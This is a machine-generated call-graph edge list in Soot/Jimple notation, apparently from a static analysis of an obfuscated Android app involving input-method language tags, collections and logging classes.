VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("Invalid private use tag, other subtag is not empty") in <ivv: int h()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <lri: boolean a(java.util.Comparator,java.lang.Iterable)>($r5, $r9) in <lqs: boolean containsAll(java.util.Collection)> ==> <lri: boolean a(java.util.Comparator,java.lang.Iterable)>
CLINIT edge: staticinvoke <hfd: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hfd: void <clinit>()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljd: int[] w()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $r27 = staticinvoke <java.lang.Float: java.lang.Float valueOf(java.lang.String)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Float: java.lang.Float valueOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hbv: void <init>(java.lang.String)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke r0.<lsc: boolean g(java.util.logging.Level)>($r1) in <lsh: lse h(java.util.logging.Level)> ==> <lsc: boolean g(java.util.logging.Level)>
SPECIAL edge: specialinvoke $r27.<java.lang.AssertionError: void <init>(java.lang.Object)>("Overflow of RecursionDepth (possible error in core library)") in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(4) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lfb: void <init>(lfa)> ==> <java.lang.Object: void <init>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean B(java.lang.String)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean B(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: java.lang.Object h(int)> ==> <ljd: java.lang.Object[] x()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>($r3, $l4, $l5, $l3) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
STATIC edge: $i3 = staticinvoke <ql: int a(int[],int,int)>($r2, $i2, $i0) in <qj: int i(java.lang.Object,int)> ==> <ql: int a(int[],int,int)>
SPECIAL edge: specialinvoke $r1.<bek: void <init>(java.nio.ByteBuffer)>($r0) in <bel: java.io.InputStream a(java.nio.ByteBuffer)> ==> <bek: void <init>(java.nio.ByteBuffer)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: void t(int)> ==> <ljd: int[] w()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lkq: int hashCode()>
SPECIAL edge: specialinvoke $r14.<lkt: void <init>(int)>($i0) in <lmb: lme f()> ==> <lkt: void <init>(int)>
SPECIAL edge: specialinvoke $r2.<lin: void <init>(ldp,lqd)>($r1, r0) in <lqd: lqd d(ldp)> ==> <lin: void <init>(ldp,lqd)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getValue()>
STATIC edge: $i2 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i2) in <lma: int e(int)> ==> <java.lang.Integer: int highestOneBit(int)>
STATIC edge: staticinvoke <iwt: void r(char[],int,int,char,char,int)>($r0, $i0, $i1, 65, 90, 32) in <iwt: void f(char[],int,int)> ==> <iwt: void r(char[],int,int,char,char,int)>
STATIC edge: $r3 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r3, $i0) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>($r2, $r1, 1) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <liy: int size()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(0) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: lsb B()>() in <lqr: lsa l()> ==> <lkq: lsb B()>
INTERFACE edge: $z1 = interfaceinvoke $r0.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lkx: void <init>()>() in <lqq: void <init>(java.lang.Object,java.lang.Object[],int)> ==> <lkx: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r5.<java.util.Iterator: boolean hasNext()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: boolean hasNext()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r0) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <iye: java.lang.Object w(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)> ==> <java.lang.Object: void <init>()>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int d(java.lang.Class,java.lang.Object,java.lang.Object)>($r7, $r1, $r8) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.ConcurrentHashMap: int d(java.lang.Class,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lsj: void <init>(java.lang.Class)>(class "Ljava/lang/Object;") in <lsl: void <clinit>()> ==> <lsj: void <init>(java.lang.Class)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: $r9 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: java.lang.Class c(java.lang.Object)>($r1) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Class c(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lsb: void <init>(int,int)>(0, 0) in <lnd: void <init>(java.lang.Object[])> ==> <lsb: void <init>(int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)>($r3, $r1) in <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])> ==> <java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)>
SPECIAL edge: specialinvoke $r0.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <izw: void as(int,java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: int hashCode()>
STATIC edge: $i6 = staticinvoke <izw: int aj(java.lang.Object,int)>($r2, $i5) in <ljd: int z(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<lsz: boolean equals(java.lang.Object)>($r6) in <lsn: boolean ac()> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <llg: java.lang.Object next()> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r5 = virtualinvoke $r7.<lsm: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
INTERFACE edge: $r5 = interfaceinvoke $r1.<ldp: java.lang.Object a(java.lang.Object)>($r4) in <hcb: java.lang.Object l(java.lang.String,ldp)> ==> <hbw: java.lang.Object a(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void a(long,int)>(1L, $i1) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: void a(long,int)>
VIRTUAL edge: r0 = virtualinvoke r0.<lqd: lqd d(ldp)>($r1) in <lqd: lqd c()> ==> <lqd: lqd d(ldp)>
STATIC edge: $r1 = staticinvoke <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])>("%s:%s", $r2) in <hnc: java.lang.String k(java.lang.String,java.lang.String)> ==> <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])>
STATIC edge: staticinvoke <iye: void Q(int,int)>($i1, $i0) in <lsb: void <init>(int,int)> ==> <iye: void Q(int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lqr: int hashCode()>
INTERFACE edge: interfaceinvoke $r3.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r1, $r5) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsq: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r0) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liz: boolean hasNext()>
VIRTUAL edge: $r1 = virtualinvoke $r3.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lak: void <init>(byte[])> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r4.<nzh: boolean f(ivv)>(r0) in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean f(ivv)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <izw: lsa w(java.lang.Object)>($r2) in <lrg: lsa l()> ==> <izw: lsa w(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean F(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean F(java.lang.String)>
STATIC edge: $r0 = staticinvoke <java.util.Collections: java.util.List emptyList()>() in <lvt: void <clinit>()> ==> <java.util.Collections: java.util.List emptyList()>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lnc: java.lang.Object next()>
STATIC edge: staticinvoke <lum: boolean n(java.lang.String,java.util.logging.Level,boolean)>($r2, $r1, $z0) in <lsh: lse h(java.util.logging.Level)> ==> <lum: boolean n(java.lang.String,java.util.logging.Level,boolean)>
CLINIT edge: staticinvoke <java.lang.Long: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Long: void <clinit>()>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r4, null) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
SPECIAL edge: specialinvoke $r4.<java.lang.IndexOutOfBoundsException: void <init>()>() in <lsm: lsz c(int)> ==> <java.lang.IndexOutOfBoundsException: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
VIRTUAL edge: $i1 = virtualinvoke r0.<ljd: int e()>() in <ljd: int f(java.lang.Object)> ==> <ljd: int e()>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i1, 2) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
STATIC edge: $r29 = staticinvoke <android.util.Base64: byte[] decode(java.lang.String,int)>($r12, 3) in <hbw: java.lang.Object a(java.lang.Object)> ==> <android.util.Base64: byte[] decode(java.lang.String,int)>
STATIC edge: $r2 = staticinvoke <lum: lto d(java.lang.String)>($r0) in <lsh: lsh j(java.lang.String)> ==> <lum: lto d(java.lang.String)>
STATIC edge: $r9 = staticinvoke <java.security.SecureRandom: byte[] getSeed(int)>(8) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.security.SecureRandom: byte[] getSeed(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $i0 = staticinvoke <kwe: int U(int,int,int)>($i0, 1, 1073741823) in <ljd: void q(int)> ==> <kwe: int U(int,int,int)>
VIRTUAL edge: $l3 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: long l()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: long l()>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean v()>() in <ljd: int b()> ==> <ljd: boolean v()>
SPECIAL edge: specialinvoke $r0.<ljd: void <init>()>() in <ljd: ljd g()> ==> <ljd: void <init>()>
STATIC edge: $z0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r5, $i2, $r4) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
STATIC edge: $r2 = staticinvoke <hnc: java.lang.String k(java.lang.String,java.lang.String)>($r2, $r3) in <hnc: java.lang.String d(hmm)> ==> <hnc: java.lang.String k(java.lang.String,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean isEmpty()>() in <ljd: int c()> ==> <ljd: boolean isEmpty()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.String: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
VIRTUAL edge: $r1 = virtualinvoke $r7.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
INTERFACE edge: $r5 = interfaceinvoke $r0.<java.util.Map: java.lang.Object get(java.lang.Object)>($r2) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>($r2) in <miv: void <clinit>()> ==> <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lkh: java.lang.Object[] n()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: java.lang.Object[] n()>
INTERFACE edge: $r9 = interfaceinvoke $r7.<java.util.Map$Entry: java.lang.Object getKey()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r8.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <lvr: void <init>(java.util.List)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r2, $r3) in <ljb: void a()> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.util.ConcurrentModificationException: void <init>()>() in <lje: void a()> ==> <java.util.ConcurrentModificationException: void <init>()>
CLINIT edge: staticinvoke <lvr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lvr: void <clinit>()>
VIRTUAL edge: $r12 = virtualinvoke $r2.<ivv: ivw a()>() in <ivw: ivw d(java.util.Locale)> ==> <ivv: ivw a()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <liz: void <init>(ljd)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r1 = staticinvoke <ivw: ivw g(java.lang.String)>($r0) in <ivw: ivw f(java.lang.String)> ==> <ivw: ivw g(java.lang.String)>
SPECIAL edge: specialinvoke $r10.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_CATEGORY_METADATA", 10, 10) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean O(char)>($c0) in <ivw: boolean u(char)> ==> <ivw: boolean O(char)>
VIRTUAL edge: $r5 = virtualinvoke r0.<lli: java.util.Collection b()>() in <lli: void e(java.lang.Object,java.lang.Object)> ==> <lmb: java.util.Collection b()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lje: java.lang.Object next()>
VIRTUAL edge: virtualinvoke $r4.<hbv: boolean m(java.lang.Object)>($r1) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <hbv: boolean m(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hny: void <init>(ivw,java.lang.String)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r3.<java.lang.String: int indexOf(int)>(95) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: int indexOf(int)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <lvs: lvs a(java.lang.Object)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("must be power of 2 between 2^1 and 2^30: ") in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljf: int size()>() in <ljf: boolean isEmpty()> ==> <ljf: int size()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liy: java.util.Iterator iterator()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Object: java.lang.Object clone()>() in <lkg: void g(int)> ==> <java.lang.Object: java.lang.Object clone()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
INTERFACE edge: $i0 = interfaceinvoke $r1.<java.util.Set: int size()>() in <ljf: int size()> ==> <java.util.HashSet: int size()>
SPECIAL edge: specialinvoke $r0.<ivv: void <init>(byte[])>(null) in <ivw: ivv I()> ==> <ivv: void <init>(byte[])>
STATIC edge: $r1 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag") in <ivw: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsn: lts l()>() in <lsd: boolean b(lsr)> ==> <lsn: lts l()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lin: void <init>(ldp,lqd)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <hcb: void <init>()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getKey()>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <lvs: void <init>(java.lang.String,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
VIRTUAL edge: virtualinvoke $r30.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(": ") in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.IndexOutOfBoundsException: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.RuntimeException: void <init>()>() in <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lsm: int a(lsz)>($r1) in <lsm: java.lang.Object d(lsz)> ==> <lsm: int a(lsz)>
SPECIAL edge: specialinvoke $r5.<java.text.SimpleDateFormat: void <init>(java.lang.String)>("yyyy-MM-dd\'T\'HH:mm:ss.SSSZ") in <lsc: void f(java.lang.String,ltn)> ==> <java.text.SimpleDateFormat: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(19) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r11.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
INTERFACE edge: $r1 = interfaceinvoke $r4.<java.util.Iterator: java.lang.Object next()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.String: char[] toCharArray()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char[] toCharArray()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lqo: void <init>(lkx,lkq)> ==> <lma: void <init>()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(": logging error [") in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $i0 = staticinvoke <izw: int ac(int)>($i0) in <izw: int ad(java.lang.Object)> ==> <izw: int ac(int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.lang.Object e(int)>($i0) in <ljf: java.util.Set f()> ==> <ljf: java.lang.Object e(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <qj: int b(java.lang.Object)> ==> <ivw: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String substring(int)>(1) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.String substring(int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c0) in <ivw: boolean y(char)> ==> <ivw: boolean u(char)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <qj: void <init>(int)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lqr: int hashCode()>
STATIC edge: $r0 = staticinvoke <lmo: lqs G(java.util.Comparator)>($r1) in <lme: lma l(java.util.Comparator)> ==> <lmo: lqs G(java.util.Comparator)>
VIRTUAL edge: virtualinvoke $r3.<lmb: void g(java.lang.Object,java.lang.Object)>($r5, $r11) in <hbv: void j()> ==> <lmb: void g(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: $r3 = staticinvoke <lri: java.util.ArrayList P(java.util.Iterator)>($r2) in <izw: java.util.Collection at(java.lang.Iterable)> ==> <lri: java.util.ArrayList P(java.util.Iterator)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>(1, "Expected size must be >= 0") in <ljd: void q(int)> ==> <iye: void y(boolean,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lid: int hashCode()>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <java.lang.Enum: int hashCode()>
SPECIAL edge: specialinvoke r0.<lqd: void <init>()>() in <lji: void <init>(java.util.Comparator)> ==> <lqd: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <lta: boolean equals(java.lang.Object)>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int b()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int b()>
SPECIAL edge: specialinvoke r0.<lsa: void <init>()>() in <llg: void <init>(llo)> ==> <lsa: void <init>()>
